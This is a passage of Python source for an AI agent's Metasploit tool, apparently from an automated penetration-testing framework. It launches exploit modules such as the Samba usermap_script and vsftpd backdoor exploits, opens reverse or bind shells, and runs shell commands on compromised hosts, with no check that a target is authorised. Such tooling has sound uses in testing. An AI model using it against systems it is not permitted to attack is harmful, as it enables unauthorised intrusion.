"""
Phase 5 — Metasploit RPC Tool

Primary: connects to msfrpcd via pymetasploit3.
Fallback: runs msfconsole subprocess when RPC is unavailable.
"""

import asyncio
import contextlib
import itertools
import logging
import os
import re
import socket
import tempfile
import threading
import time

from config import settings
from models.exploit_result import ExploitResult
from tools.base_tool import BaseTool, ToolMetadata

logger = logging.getLogger(__name__)

EXPLOIT_TIMEOUT = 90   # seconds for RPC
MSF_CONSOLE_TIMEOUT = 120  # seconds for msfconsole subprocess (slower to start)
_CMD_TIMEOUT = 30  # seconds for session command execution
_RPC_SESSION_POLL_TIMEOUT = 30.0
_RPC_SESSION_POLL_INTERVAL = 0.5

# ── LPORT auto-allocator ──────────────────────────────────────────────────────
# When multiple exploit agents run concurrently, they must not share LPORT 4444.
# This counter cycles through a range of ports so each msfconsole invocation
# gets its own handler port, preventing "Handler failed to bind" errors.
_LPORT_POOL_START = 4400
_LPORT_POOL_END = 4500
_lport_counter = itertools.cycle(range(_LPORT_POOL_START, _LPORT_POOL_END))
_lport_lock = threading.Lock()

# Patterns that indicate a session was opened in msfconsole output
_SESSION_PATTERNS = [
    re.compile(r"session\s+\d+\s+opened", re.IGNORECASE),
    re.compile(r"command shell session\s+\d+", re.IGNORECASE),
    re.compile(r"meterpreter session\s+\d+", re.IGNORECASE),
    re.compile(r"opened\s+.*->", re.IGNORECASE),
]


def _session_opened(text: str) -> bool:
    return any(p.search(text) for p in _SESSION_PATTERNS)


class MetasploitTool(BaseTool):

    def __init__(self):
        self._client = None   # pymetasploit3 MsfRpcClient — lazy connection

    @property
    def metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="metasploit_run",
            description=(
                "Metasploit Framework tool. Actions:\n"
                "  run          — Launch an exploit module against a target\n"
                "  session_exec — Execute a shell command on an open MSF session\n"
                "  sessions     — List active sessions\n"
                "  search       — Search MSF modules by keyword"
            ),
            parameters={
                "type": "object",
                "properties": {
                    "module": {
                        "type": "string",
                        "description": "Metasploit module path (e.g. 'exploit/unix/ftp/vsftpd_234_backdoor')",
                    },
                    "target_ip": {
                        "type": "string",
                        "description": "Target IP address. Use 'target_ip' (not 'rhosts' or 'rhost')",
                    },
                    "target_port": {
                        "type": "integer",
                        "description": "Target port number. Use 'target_port' (not 'rport')",
                    },
                    "payload": {
                        "type": "string",
                        "description": "Payload to use (leave empty for auto-select)",
                        "default": "",
                    },
                    "options": {
                        "type": "object",
                        "description": "Extra module options (key-value)",
                        "default": {},
                    },
                    "action": {
                        "type": "string",
                        "description": "'run' | 'session_exec' | 'sessions' | 'search'",
                        "default": "run",
                    },
                    "session_id": {
                        "type": "integer",
                        "description": "Session ID to interact with (for action='session_exec')",
                    },
                    "command": {
                        "type": "string",
                        "description": "Shell command to run on the session (for action='session_exec')",
                    },
                    "query": {
                        "type": "string",
                        "description": "Query for module search (used with action='search')",
                        "default": "",
                    },
                    "post_commands": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": (
                            "Shell commands to run on the session immediately after the exploit "
                            "succeeds (action='run' only). These run in the same msfconsole "
                            "invocation so they work even without msfrpcd. "
                            "Example: ['whoami', 'id', 'uname -a']"
                        ),
                        "default": [],
                    },
                },
                "required": ["action"],
            },
            category="exploit-exec",
        )

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    async def validate(self, params: dict) -> tuple[bool, str]:
        action = params.get("action", "run")
        if action not in ("run", "search", "sessions", "session_exec"):
            return False, f"Invalid action: '{action}'. Options: run, session_exec, sessions, search"
        if action == "run":
            for field in ("module", "target_ip", "target_port"):
                if not params.get(field):
                    return False, f"'{field}' is required for action='run'"
            module = params.get("module", "")
            if module.startswith("auxiliary/") or module.startswith("post/"):
                mod_type = "auxiliary" if module.startswith("auxiliary/") else "post"
                return False, (
                    f"Module '{module}' is a {mod_type}/ module — "
                    "metasploit_run only supports exploit/ modules. "
                    "For r-services (512/513/514) use rsh_exec tool directly. "
                    "For SSH credential testing use ssh_tool."
                )
        if action == "session_exec":
            if params.get("session_id") is None:
                return False, "'session_id' is required for action='session_exec'"
            if not params.get("command", "").strip():
                return False, "'command' is required for action='session_exec'"
        return True, ""

    # Common module path mistakes by LLMs → correct paths
    _MODULE_ALIASES: dict[str, str] = {
        "exploit/linux/samba/usermap_script":  "exploit/multi/samba/usermap_script",
        "exploit/unix/samba/usermap_script":   "exploit/multi/samba/usermap_script",
        "exploit/unix/smb/usermap_script":     "exploit/multi/samba/usermap_script",
        "exploit/linux_x86/samba/trans2open":  "exploit/linux/samba/trans2open",
        "exploit/linux/samba/nttrans":         "exploit/multi/samba/nttrans",
        "exploit/linux/samba/is_known_pipename": "exploit/linux/samba/is_known_pipename",
    }

    @classmethod
    def _normalize_params(cls, params: dict) -> dict:
        """Map LLM-style MSF names to internal names before validation."""
        p = dict(params)
        # Fix common module path mistakes
        if "module" in p and p["module"] in cls._MODULE_ALIASES:
            p["module"] = cls._MODULE_ALIASES[p["module"]]
        # RHOSTS / RHOST → target_ip
        for alias in ("rhosts", "rhost", "RHOSTS", "RHOST"):
            if alias in p and "target_ip" not in p:
                p["target_ip"] = p.pop(alias)
            else:
                p.pop(alias, None)
        # RPORT → target_port
        for alias in ("rport", "RPORT"):
            if alias in p and "target_port" not in p:
                p["target_port"] = p.pop(alias)
            else:
                p.pop(alias, None)
        # LHOST / lhost → options["LHOST"] (top-level only)
        for alias in ("lhost", "LHOST"):
            if alias in p:
                p.setdefault("options", {})["LHOST"] = p.pop(alias)
        # LPORT / lport → options["LPORT"] (top-level only)
        for alias in ("lport", "LPORT"):
            if alias in p:
                p.setdefault("options", {})["LPORT"] = p.pop(alias)
        # Coerce options to dict — LLM may pass "" or null
        if "options" in p and not isinstance(p["options"], dict):
            p["options"] = {}
        # Normalize option keys inside the options dict to UPPERCASE
        # so that 'lhost', 'lport', 'LHOST', 'LPORT' all collapse to one key.
        if "options" in p and isinstance(p["options"], dict):
            normalized_opts: dict = {}
            for k, v in p["options"].items():
                normalized_opts[k.upper()] = v
            p["options"] = normalized_opts
        return p

    @staticmethod
    def _extract_module_name(item) -> str:
        if isinstance(item, str):
            return item.strip()
        if isinstance(item, dict):
            for key in ("fullname", "name", "path"):
                value = item.get(key)
                if isinstance(value, str) and value.strip():
                    return value.strip()
        return ""

    async def _rpc_module_exists(self, client, module_path: str) -> bool:
        module_path = (module_path or "").strip()
        if not module_path:
            return False
        loop = asyncio.get_running_loop()
        try:
            result = await loop.run_in_executor(
                None, lambda: client.modules.search(f"fullname:{module_path}")
            )
        except Exception as exc:
            logger.warning("[MSF-RPC] module search failed for '%s': %s", module_path, exc)
            return False

        modules: list = []
        if isinstance(result, list):
            modules = result
        elif isinstance(result, dict):
            if isinstance(result.get("modules"), list):
                modules = result["modules"]
            elif isinstance(result.get("results"), list):
                modules = result["results"]
        elif isinstance(result, bool):
            # Some clients may return a bool for empty search results.
            return False

        for item in modules:
            name = self._extract_module_name(item)
            if name == module_path:
                return True
        return False

    async def _resolve_module_path_rpc(self, client, module_path: str) -> tuple[str, str | None]:
        canonical = self._MODULE_ALIASES.get(module_path, module_path)
        if await self._rpc_module_exists(client, canonical):
            if canonical != module_path:
                logger.info("[MSF-RPC] canonicalized module '%s' -> '%s'", module_path, canonical)
            return canonical, None
        return "", (
            f"Metasploit module not found/unsupported: '{module_path}' "
            f"(canonical: '{canonical}')"
        )

    @staticmethod
    def _is_valid_module_path(module_path: str) -> bool:
        return bool(re.match(r"^(exploit|auxiliary|post|payload|encoder|nop)/[a-z0-9_./-]+$", module_path or ""))

    async def _resolve_module_path_msfconsole(self, module_path: str) -> tuple[str, str | None]:
        """Resolve aliases and fail-fast validate module availability in msfconsole mode."""
        requested = (module_path or "").strip()
        canonical = self._MODULE_ALIASES.get(requested, requested)

        if not self._is_valid_module_path(canonical):
            return "", (
                f"Metasploit module not found/unsupported: '{requested}' "
                f"(canonical: '{canonical}')"
            )

        output = await self._run_msfconsole([f"search {canonical}"], timeout=45)
        found_paths: set[str] = set()
        for line in output.splitlines():
            m = re.match(r"^\s*\d+\s+(\S+/\S+)\s+", line.strip())
            if m:
                found_paths.add(m.group(1).strip())
        if canonical in found_paths:
            if canonical != requested:
                self._emit_msf_event(
                    "msfconsole_module_canonicalized",
                    requested=requested,
                    canonical=canonical,
                )
            return canonical, None

        return "", (
            f"Metasploit module not found/unsupported: '{requested}' "
            f"(canonical: '{canonical}')"
        )

    @staticmethod
    def _emit_msf_event(event: str, **fields) -> None:
        details = " ".join(f"{k}={v}" for k, v in fields.items() if v is not None)
        if details:
            logger.info("[MSF-EVENT] event=%s %s", event, details)
        else:
            logger.info("[MSF-EVENT] event=%s", event)

    @staticmethod
    def _coerce_session_id(raw) -> int | None:
        if raw is None:
            return None
        try:
            return int(raw)
        except (TypeError, ValueError):
            return None

    @staticmethod
    def _is_payload_incompatible_text(text: str) -> bool:
        lowered = (text or "").lower()
        return (
            "invalid payload" in lowered
            or "not a compatible payload" in lowered
            or "is not compatible with this exploit" in lowered
            or "no compatible payloads" in lowered
        )

    @classmethod
    def _order_payload_candidates(
        cls,
        requested_payload: str,
        compatible_payloads: list[str],
    ) -> list[str]:
        seen: set[str] = set()
        ordered: list[str] = []

        def add(name: str) -> None:
            name = (name or "").strip()
            if not name or name in seen:
                return
            seen.add(name)
            ordered.append(name)

        add(requested_payload)

        pref_keywords = ("interact", "bind", "shell")
        for kw in pref_keywords:
            for payload in compatible_payloads:
                if kw in payload.lower():
                    add(payload)
        for payload in compatible_payloads:
            add(payload)

        for payload in cls._PAYLOAD_FALLBACKS:
            add(payload)
        return ordered

    @staticmethod
    def _collect_session_ids(sessions: dict) -> set[int]:
        out: set[int] = set()
        for sid in sessions.keys():
            try:
                out.add(int(sid))
            except (TypeError, ValueError):
                continue
        return out

    @staticmethod
    def _session_matches_target(info: dict, target_ip: str) -> bool:
        if not isinstance(info, dict):
            return False
        keys = (
            "target_host",
            "session_host",
            "tunnel_peer",
            "peer_host",
            "host",
            "target",
            "via_target",
        )
        for key in keys:
            value = info.get(key)
            if isinstance(value, str) and target_ip in value:
                return True
        return False

    @staticmethod
    def _session_matches_module(info: dict, module_path: str) -> bool:
        if not isinstance(info, dict):
            return False
        via_exploit = info.get("via_exploit")
        if isinstance(via_exploit, str) and module_path in via_exploit:
            return True
        module_leaf = module_path.split("/")[-1]
        if module_leaf and isinstance(via_exploit, str) and module_leaf in via_exploit:
            return True
        return False

    @staticmethod
    def _available_option_names(exploit) -> set[str]:
        try:
            opts = getattr(exploit, "options", {}) or {}
        except Exception:
            opts = {}
        if isinstance(opts, dict):
            return {str(k).upper() for k in opts.keys()}
        if isinstance(opts, list):
            return {str(k).upper() for k in opts}
        return set()

    def _poll_for_session(
        self,
        client,
        target_ip: str,
        module_path: str,
        baseline_session_ids: set[int],
    ) -> tuple[int | None, dict]:
        start = time.monotonic()
        attempts = 0
        timeout = _RPC_SESSION_POLL_TIMEOUT
        interval = _RPC_SESSION_POLL_INTERVAL
        self._emit_msf_event(
            "rpc_session_poll_start",
            target_ip=target_ip,
            module=module_path,
            timeout=timeout,
            interval=interval,
        )

        while (time.monotonic() - start) < timeout:
            attempts += 1
            try:
                sessions = dict(client.sessions.list or {})
            except Exception as exc:
                self._emit_msf_event("rpc_session_poll_error", attempt=attempts, error=str(exc))
                time.sleep(interval)
                continue

            candidates: list[tuple[int, int]] = []  # (score, session_id)
            for sid_raw, info in sessions.items():
                sid = self._coerce_session_id(sid_raw)
                if sid is None or sid in baseline_session_ids:
                    continue
                score = 0
                if self._session_matches_target(info, target_ip):
                    score += 2
                if self._session_matches_module(info, module_path):
                    score += 1
                candidates.append((score, sid))

            if candidates:
                candidates.sort(key=lambda x: (x[0], x[1]), reverse=True)
                score, chosen_sid = candidates[0]
                if score > 0 or len(candidates) == 1:
                    meta = {
                        "attempts": attempts,
                        "timeout_seconds": timeout,
                        "interval_seconds": interval,
                        "matched": True,
                        "score": score,
                        "reason": "session_matched",
                    }
                    self._emit_msf_event(
                        "rpc_session_poll_match",
                        attempts=attempts,
                        session_id=chosen_sid,
                        score=score,
                    )
                    return chosen_sid, meta

            time.sleep(interval)

        meta = {
            "attempts": attempts,
            "timeout_seconds": timeout,
            "interval_seconds": interval,
            "matched": False,
            "reason": "timeout",
        }
        self._emit_msf_event("rpc_session_poll_timeout", attempts=attempts)
        return None, meta

    def _run_post_commands_rpc(self, client, session_id: int, commands: list[str]) -> tuple[str, list[str]]:
        blocks: list[str] = []
        errors: list[str] = []
        for idx, cmd in enumerate(commands):
            cmd = (cmd or "").strip()
            if not cmd:
                continue
            result = self._blocking_session_exec(client, session_id, cmd)
            if result.get("success"):
                output = (result.get("output") or {}).get("result", "")
                blocks.append(f"$ {cmd}\n{output}".rstrip())
            else:
                err = result.get("error") or "unknown error"
                errors.append(f"{cmd}: {err}")
                blocks.append(f"$ {cmd}\n[error] {err}")
                self._emit_msf_event("rpc_post_command_failed", index=idx, command=cmd, error=err)
        combined = "\n\n".join(blocks).strip()
        return combined, errors

    async def execute(self, params: dict) -> dict:
        params = self._normalize_params(params)
        ok, msg = await self.validate(params)
        if not ok:
            return {"success": False, "output": None, "error": msg}

        action = params.get("action", "run")

        # ── Try RPC first ─────────────────────────────────────────────
        try:
            client = await self._get_client()
            self._emit_msf_event("rpc_available", action=action)
            if action == "search":
                return await self._search_modules(client, params.get("query", ""))
            if action == "sessions":
                return await self._list_sessions(client)
            if action == "session_exec":
                return await self._session_exec_rpc(client, params)
            # Native-shell modules (vsftpd, samba usermap_script, distcc) require
            # msfconsole-specific logic: stale-port cleanup, bind-payload iteration,
            # "Backdoor has been spawned" detection. The RPC path lacks all of this
            # and always hits the 90s timeout. Force msfconsole even when RPC is up.
            module = params.get("module", "")
            canonical = self._MODULE_ALIASES.get(module, module)
            if self._is_native_shell_module(canonical):
                self._emit_msf_event(
                    "native_shell_msfconsole_forced",
                    module=canonical,
                    reason="native_shell_modules_require_msfconsole_logic",
                )
                return await self._run_via_msfconsole(params)
            try:
                return await self._run_exploit(client, params)
            except TimeoutError:
                return {"success": False, "output": None, "error": f"Exploit timed out ({EXPLOIT_TIMEOUT}s)"}

        except Exception as exc:
            rpc_err = str(exc)
            logger.warning("Metasploit RPC unavailable (%s) — falling back to msfconsole", rpc_err)
            self._emit_msf_event("rpc_unavailable_fallback", action=action, reason=rpc_err)
            self._client = None  # reset so next call re-tries RPC

        # ── msfconsole fallback ───────────────────────────────────────
        if action == "run":
            return await self._run_via_msfconsole(params)
        if action == "search":
            return await self._search_via_msfconsole(params.get("query", ""))
        if action == "sessions":
            return await self._sessions_via_msfconsole()
        if action == "session_exec":
            if settings.msf.persistent_console:
                return await self._session_exec_via_msfconsole(params)
            sid = params.get("session_id")
            return {
                "success": False,
                "output": None,
                "error": (
                    f"Cannot execute on session {sid}: msfrpcd is unavailable and one-shot "
                    "msfconsole fallback cannot persist sessions across calls. "
                    "Use post_commands in the original run action or enable msfrpcd."
                ),
            }

        return {"success": False, "output": None, "error": "Unknown action"}

    # ------------------------------------------------------------------
    # RPC actions
    # ------------------------------------------------------------------

    async def _run_exploit(self, client, params: dict) -> dict:
        requested_module: str = params["module"]
        target_ip: str = params["target_ip"]
        target_port: int = int(params["target_port"])
        payload: str = params.get("payload", "")
        extra_opts: dict = params.get("options", {})
        post_commands: list[str] = params.get("post_commands") or []

        loop = asyncio.get_running_loop()
        start = time.monotonic()
        module_path, module_err = await self._resolve_module_path_rpc(client, requested_module)
        if module_err:
            self._emit_msf_event("rpc_module_not_found", module=requested_module)
            return {
                "success": False,
                "output": {
                    "module": requested_module,
                    "canonical_module": self._MODULE_ALIASES.get(requested_module, requested_module),
                    "reason": "module_not_found",
                },
                "error": module_err,
            }
        if module_path != requested_module:
            self._emit_msf_event(
                "rpc_module_canonicalized",
                requested=requested_module,
                canonical=module_path,
            )

        try:
            run_data: dict = await asyncio.wait_for(
                loop.run_in_executor(
                    None,
                    lambda: self._blocking_run(
                        client,
                        module_path,
                        target_ip,
                        target_port,
                        payload,
                        extra_opts,
                        post_commands,
                    ),
                ),
                timeout=EXPLOIT_TIMEOUT,
            )
        except TimeoutError:
            return {
                "success": False,
                "output": None,
                "error": f"Exploit timed out ({EXPLOIT_TIMEOUT}s)",
            }
        except Exception as exc:
            return {"success": False, "output": None, "error": str(exc)}

        result: ExploitResult = run_data["result"]
        result.duration_seconds = time.monotonic() - start
        output = result.model_dump()
        if requested_module != module_path:
            output["module_alias_resolved_from"] = requested_module
        if run_data.get("session_polling") is not None:
            output["session_polling"] = run_data["session_polling"]
        if run_data.get("payload_attempts"):
            output["payload_attempts"] = run_data["payload_attempts"]
        post_output = run_data.get("post_command_output")
        if post_output:
            output["post_command_output"] = post_output[:3000]
        if run_data.get("post_command_errors"):
            output["post_command_errors"] = run_data["post_command_errors"]

        if result.success:
            self._emit_msf_event(
                "rpc_exploit_success",
                module=module_path,
                target_ip=target_ip,
                session_id=result.session_id,
            )
        else:
            self._emit_msf_event(
                "rpc_exploit_failed",
                module=module_path,
                target_ip=target_ip,
                reason=result.error,
            )
        return {
            "success": result.success,
            "output": output,
            "error": result.error,
            "post_output": post_output[:3000] if post_output else None,
        }

    def _blocking_run(
        self,
        client,
        module_path: str,
        target_ip: str,
        target_port: int,
        payload: str,
        extra_opts: dict,
        post_commands: list[str] | None = None,
    ) -> dict:
        """Synchronous Metasploit exploit run for the RPC path."""
        post_commands = post_commands or []
        run_meta: dict = {
            "session_polling": None,
            "payload_attempts": [],
            "post_command_output": None,
            "post_command_errors": [],
        }
        try:
            base_exploit = client.modules.use("exploit", module_path)
            available_options = self._available_option_names(base_exploit)
            is_native_mod = self._is_native_shell_module(module_path)
            enforce_option_whitelist = bool(available_options)

            filtered_opts: dict[str, object] = {}
            for key, val in extra_opts.items():
                key_u = str(key).upper()
                if is_native_mod and key_u in {"LHOST", "LPORT"}:
                    self._emit_msf_event(
                        "rpc_option_skipped",
                        module=module_path,
                        option=key_u,
                        reason="native_module_profile",
                    )
                    continue
                if not enforce_option_whitelist or key_u in available_options:
                    filtered_opts[key_u] = val
                else:
                    self._emit_msf_event(
                        "rpc_option_skipped",
                        module=module_path,
                        option=key_u,
                        reason="unsupported_option",
                    )

            try:
                baseline_sessions = dict(client.sessions.list or {})
            except Exception:
                baseline_sessions = {}
            baseline_ids = self._collect_session_ids(baseline_sessions)

            compatible_payloads = []
            try:
                raw_payloads = base_exploit.targetpayloads() or []
                compatible_payloads = [
                    name.strip() for name in raw_payloads if isinstance(name, str) and name.strip()
                ]
            except Exception:
                compatible_payloads = []

            payload_candidates = self._order_payload_candidates(payload, compatible_payloads)
            if not payload_candidates:
                run_meta["result"] = ExploitResult(
                    success=False,
                    module=module_path,
                    target_ip=target_ip,
                    target_port=target_port,
                    error="No compatible payload found",
                )
                return run_meta

            selected_payload = ""
            selected_session_id: int | None = None
            last_output = {}
            last_error = ""

            for idx, candidate in enumerate(payload_candidates, start=1):
                try:
                    payload_obj = client.modules.use("payload", candidate)
                except Exception as exc:
                    err_text = str(exc)
                    run_meta["payload_attempts"].append(
                        {"attempt": idx, "payload": candidate, "error": err_text}
                    )
                    last_error = err_text
                    self._emit_msf_event(
                        "rpc_payload_candidate_rejected",
                        attempt=idx,
                        payload=candidate,
                        reason="payload_load_failed",
                    )
                    continue

                try:
                    exploit = client.modules.use("exploit", module_path)
                    exploit["RHOSTS"] = target_ip
                    exploit["RPORT"] = target_port
                    for key, val in filtered_opts.items():
                        exploit[key] = val
                except Exception as exc:
                    err_text = str(exc)
                    run_meta["payload_attempts"].append(
                        {"attempt": idx, "payload": candidate, "error": err_text}
                    )
                    last_error = err_text
                    self._emit_msf_event(
                        "rpc_payload_candidate_rejected",
                        attempt=idx,
                        payload=candidate,
                        reason="exploit_init_failed",
                    )
                    continue

                is_reverse_candidate = ("reverse" in candidate.lower() or "meterpreter" in candidate.lower())
                if not is_native_mod and is_reverse_candidate:
                    lhost = self._get_lhost(target_ip)
                    if lhost and (not enforce_option_whitelist or "LHOST" in available_options):
                        exploit["LHOST"] = lhost
                    elif lhost and enforce_option_whitelist and "LHOST" not in available_options:
                        self._emit_msf_event(
                            "rpc_option_skipped",
                            module=module_path,
                            option="LHOST",
                            reason="unsupported_option",
                        )

                    if (not enforce_option_whitelist or "LPORT" in available_options) and "LPORT" not in filtered_opts:
                        try:
                            exploit["LPORT"] = self._allocate_lport()
                        except Exception:
                            pass

                try:
                    output = exploit.execute(payload=payload_obj)
                except Exception as exc:
                    err_text = str(exc)
                    run_meta["payload_attempts"].append(
                        {"attempt": idx, "payload": candidate, "error": err_text}
                    )
                    last_error = err_text
                    if self._is_payload_incompatible_text(err_text):
                        self._emit_msf_event(
                            "rpc_payload_fallback",
                            attempt=idx,
                            payload=candidate,
                            reason="incompatible_payload",
                        )
                    else:
                        self._emit_msf_event(
                            "rpc_payload_candidate_rejected",
                            attempt=idx,
                            payload=candidate,
                            reason="execute_exception",
                        )
                    continue

                output_dict = output if isinstance(output, dict) else {"raw": str(output)}
                last_output = output_dict
                session_id = self._coerce_session_id(output_dict.get("session_id"))
                poll_meta = None
                if session_id is None:
                    session_id, poll_meta = self._poll_for_session(
                        client,
                        target_ip,
                        module_path,
                        baseline_ids,
                    )
                    run_meta["session_polling"] = poll_meta

                run_meta["payload_attempts"].append(
                    {
                        "attempt": idx,
                        "payload": candidate,
                        "job_id": output_dict.get("job_id"),
                        "session_id": session_id,
                        "polled": poll_meta is not None,
                    }
                )

                if session_id is not None:
                    selected_payload = candidate
                    selected_session_id = session_id
                    break

                exec_text = str(output_dict)
                if self._is_payload_incompatible_text(exec_text):
                    last_error = "Invalid/incompatible payload"
                    self._emit_msf_event(
                        "rpc_payload_fallback",
                        attempt=idx,
                        payload=candidate,
                        reason="incompatible_payload_output",
                    )
                    continue
                last_error = "Session could not be opened"

            if selected_session_id is None:
                run_meta["result"] = ExploitResult(
                    success=False,
                    module=module_path,
                    target_ip=target_ip,
                    target_port=target_port,
                    payload=selected_payload or payload,
                    session_id=None,
                    output=str(last_output),
                    error=last_error or "Session could not be opened",
                )
                return run_meta

            if post_commands:
                post_output, post_errors = self._run_post_commands_rpc(
                    client, selected_session_id, post_commands
                )
                run_meta["post_command_output"] = post_output
                run_meta["post_command_errors"] = post_errors

            run_meta["result"] = ExploitResult(
                success=True,
                module=module_path,
                target_ip=target_ip,
                target_port=target_port,
                payload=selected_payload,
                session_id=selected_session_id,
                output=str(last_output),
                error=None,
            )
            return run_meta
        except Exception as exc:
            run_meta["result"] = ExploitResult(
                success=False,
                module=module_path,
                target_ip=target_ip,
                target_port=target_port,
                error=str(exc),
            )
            return run_meta

    async def _search_modules(self, client, query: str) -> dict:
        loop = asyncio.get_running_loop()
        try:
            modules = await loop.run_in_executor(
                None, lambda: client.modules.search(query)
            )
            return {
                "success": True,
                "output": {"query": query, "modules": modules[:50]},
                "error": None,
            }
        except Exception as exc:
            return {"success": False, "output": None, "error": str(exc)}

    async def _list_sessions(self, client) -> dict:
        loop = asyncio.get_running_loop()
        try:
            sessions = await loop.run_in_executor(
                None, lambda: dict(client.sessions.list)
            )
            return {
                "success": True,
                "output": {"sessions": sessions, "count": len(sessions)},
                "error": None,
            }
        except Exception as exc:
            return {"success": False, "output": None, "error": str(exc)}

    async def _session_exec_rpc(self, client, params: dict) -> dict:
        """Execute a command on an existing MSF session via RPC."""
        session_id = int(params["session_id"])
        command = params["command"].strip()
        loop = asyncio.get_running_loop()
        try:
            result = await asyncio.wait_for(
                loop.run_in_executor(
                    None,
                    lambda: self._blocking_session_exec(client, session_id, command),
                ),
                timeout=_CMD_TIMEOUT,
            )
            return result
        except asyncio.TimeoutError:
            return {"success": False, "output": None, "error": f"Session command timed out ({_CMD_TIMEOUT}s)"}
        except Exception as exc:
            return {"success": False, "output": None, "error": str(exc)}

    def _blocking_session_exec(self, client, session_id: int, command: str) -> dict:
        """Synchronous session command execution via RPC."""
        try:
            sessions = client.sessions.list
            if str(session_id) not in sessions and session_id not in sessions:
                available = list(sessions.keys()) if sessions else []
                return {
                    "success": False,
                    "output": None,
                    "error": f"Session {session_id} not found. Active sessions: {available}",
                }

            shell = client.sessions.session(str(session_id))
            output = ""
            exec_errors: list[str] = []

            if hasattr(shell, "shell_command_token"):
                try:
                    token_out = shell.shell_command_token(command, 15)
                    if token_out:
                        output = str(token_out)
                except Exception as exc:
                    exec_errors.append(f"shell_command_token: {exc}")

            if not output and hasattr(shell, "run_with_output"):
                try:
                    run_out = shell.run_with_output(command)
                    if run_out:
                        output = str(run_out)
                except Exception as exc:
                    exec_errors.append(f"run_with_output: {exc}")

            if not output and hasattr(shell, "write") and hasattr(shell, "read"):
                try:
                    shell.write(command + "\n")
                    time.sleep(2)  # give the command time to execute
                    read_out = shell.read()
                    if read_out:
                        output = str(read_out)
                except Exception as exc:
                    exec_errors.append(f"write/read: {exc}")

            if not output and exec_errors:
                return {
                    "success": False,
                    "output": None,
                    "error": "; ".join(exec_errors)[:500],
                }

            return {
                "success": True,
                "output": {
                    "session_id": session_id,
                    "command": command,
                    "result": output,
                },
                "error": None,
            }
        except Exception as exc:
            return {"success": False, "output": None, "error": str(exc)}

    # ------------------------------------------------------------------
    # msfconsole subprocess fallback
    # ------------------------------------------------------------------

    @staticmethod
    def _find_msfconsole() -> str:
        """Locate the msfconsole binary across platforms.

        Search order:
        1. PATH lookup (covers Kali, most Linux distros, macOS Homebrew)
        2. Common installation directories per platform
        """
        import shutil
        from core.platform_utils import IS_WINDOWS, IS_MACOS

        # 1. Config override (MSF_CONSOLE_PATH env var or settings)
        try:
            from config import settings
            if settings.msf.msfconsole_path:
                return settings.msf.msfconsole_path
        except Exception:
            pass

        # 2. PATH lookup (covers Kali, Parrot, BlackArch, macOS Homebrew, etc.)
        path_hit = shutil.which("msfconsole")
        if path_hit:
            return path_hit

        # 3. Common fixed installation paths per platform
        candidates: list[str] = []
        if IS_WINDOWS:
            candidates = [
                r"C:\metasploit-framework\bin\msfconsole.bat",
                r"C:\Program Files\Metasploit Framework\bin\msfconsole.bat",
                r"C:\Program Files (x86)\Metasploit Framework\bin\msfconsole.bat",
                os.path.expandvars(r"%LOCALAPPDATA%\metasploit-framework\bin\msfconsole.bat"),
            ]
        elif IS_MACOS:
            candidates = [
                "/opt/metasploit-framework/bin/msfconsole",
                "/usr/local/bin/msfconsole",
                "/opt/homebrew/bin/msfconsole",
            ]
        else:
            # Linux: Kali, Parrot, BlackArch, Ubuntu (snap), Arch (AUR), Docker
            candidates = [
                "/usr/bin/msfconsole",               # Kali, Parrot, Debian packages
                "/usr/local/bin/msfconsole",          # manual install
                "/opt/metasploit-framework/bin/msfconsole",   # official installer
                "/snap/metasploit-framework/current/bin/msfconsole",  # Ubuntu snap
                "/usr/share/metasploit-framework/msfconsole",         # some Arch packages
                os.path.expanduser("~/.rbenv/shims/msfconsole"),       # rbenv install
                os.path.expanduser("~/.rvm/gems/default/bin/msfconsole"),  # rvm install
            ]

        for c in candidates:
            if os.path.isfile(c):
                return c

        return "msfconsole"  # final fallback — let the OS raise FileNotFoundError

    async def _run_msfconsole(self, rc_commands: list[str], timeout: int = MSF_CONSOLE_TIMEOUT) -> str:
        """Write an .rc script and run msfconsole -q -r <file>. Returns stdout."""
        rc_content = "\n".join(rc_commands) + "\nexit -y\n"
        logger.info("msfconsole RC script:\n%s", rc_content)

        fd, rc_path = tempfile.mkstemp(suffix=".rc", prefix="tirpan_msf_")
        try:
            with os.fdopen(fd, "w") as f:
                f.write(rc_content)

            msf_bin = self._find_msfconsole()
            logger.info("Launching msfconsole: %s -q -r %s (timeout=%ds)", msf_bin, rc_path, timeout)

            proc = await asyncio.create_subprocess_exec(
                msf_bin, "-q", "-r", rc_path,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
            )
            try:
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
                output = stdout.decode("utf-8", errors="replace")
                # DEBUG: log full output so we can see exactly what msfconsole produced
                logger.debug("[TIRPAN-DEBUG] msfconsole FULL output (%d chars):\n%s", len(output), output)
                logger.info("msfconsole output (%d chars):\n%s", len(output), output[:4000])
                return output
            except asyncio.CancelledError:
                self._emit_msf_event("msfconsole_cancelled", timeout=timeout)
                with contextlib.suppress(ProcessLookupError):
                    proc.terminate()
                try:
                    await asyncio.wait_for(proc.wait(), timeout=2.0)
                except asyncio.TimeoutError:
                    with contextlib.suppress(ProcessLookupError):
                        proc.kill()
                    with contextlib.suppress(Exception):
                        await proc.wait()
                raise
            except asyncio.TimeoutError:
                proc.kill()
                await proc.communicate()
                logger.error("msfconsole timed out after %ds — killed", timeout)
                return "[TIRPAN] msfconsole timed out after %ds. The exploit may need more time or msfconsole is stuck." % timeout
        finally:
            try:
                os.unlink(rc_path)
            except OSError:
                pass

    @staticmethod
    def _get_lhost(target_ip: str) -> str:
        """Return the local IP address that the target can reach back to.

        Priority:
        1. MSF_LHOST_OVERRIDE (manual override for NAT/WSL/VPN setups)
        2. VPN/tunnel interface on HTB/THM/exam networks (tun0, tap0, ppp0)
        3. Interface on the same subnet as target_ip
        4. Socket routing trick (kernel routing table query)
        5. Any non-loopback IPv4 address
        """
        if settings.msf.lhost_override:
            return settings.msf.lhost_override

        import ipaddress
        import re
        import socket
        import subprocess
        from core.platform_utils import IS_WINDOWS

        def _parse_ip_prefix(text: str) -> list[tuple[str, str, int]]:
            """Extract (interface, ip, prefix_len) triples from ip addr / ifconfig."""
            triples = []
            current_iface = ""
            for line in text.splitlines():
                # ip addr line: "2: eth0: <...>"
                m_iface = re.match(r"^\d+:\s+(\S+):", line)
                if m_iface:
                    current_iface = m_iface.group(1).rstrip(":")
                # inet 192.168.1.5/24 or inet 192.168.1.5 netmask 255.255.255.0
